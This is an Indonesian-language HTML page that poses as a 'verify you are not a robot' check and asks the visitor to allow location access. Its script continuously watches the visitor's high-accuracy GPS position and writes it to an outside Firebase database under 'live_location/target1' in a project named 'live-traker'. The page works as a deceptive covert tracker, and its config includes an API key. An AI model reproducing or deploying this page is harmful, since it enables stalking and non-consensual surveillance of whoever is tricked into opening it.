<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center h-screen">
    <div class="bg-gray-800 p-8 rounded-2xl shadow-2xl max-w-sm text-center border border-gray-700">
        <h2 class="text-2xl font-bold mb-4">Konfirmasi Akses</h2>
        <p class="text-gray-400 mb-6">Harap izinkan akses lokasi untuk memverifikasi bahwa Anda bukan robot.</p>
        <button onclick="mulaiLacak()" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-bold transition-all w-full shadow-lg">
            SAYA SETUJU
        </button>
        <p id="status" class="mt-4 text-xs text-gray-500 italic"></p>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQW4WSw-O2JYDnZfBciUPTVzm07rcsyXs",
            authDomain: "live-traker-e7ce2.firebaseapp.com",
            projectId: "live-traker-e7ce2",
            storageBucket: "live-traker-e7ce2.firebasestorage.app",
            messagingSenderId: "425874298746",
            appId: "1:425874298746:web:949db14ea30a1e742068c3",
            measurementId: "G-7PD74XWDSN",
            databaseURL: "https://live-traker-e7ce2-default-rtdb.firebaseio.com"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function mulaiLacak() {
            const status = document.getElementById('status');
            if (!navigator.geolocation) {
                status.innerText = "Browser tidak mendukung GPS.";
                return;
            }
            status.innerText = "Memverifikasi...";

            navigator.geolocation.watchPosition((position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                // Simpan ke Firebase Realtime Database
                database.ref('live_location/target1').set({
                    latitude: lat,
                    longitude: lon,
                    accuracy: position.coords.accuracy,
                    timestamp: Date.now()
                });

                status.innerText = "Verifikasi Berhasil!";
            }, (error) => {
                status.innerText = "Akses Lokasi Ditolak.";
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
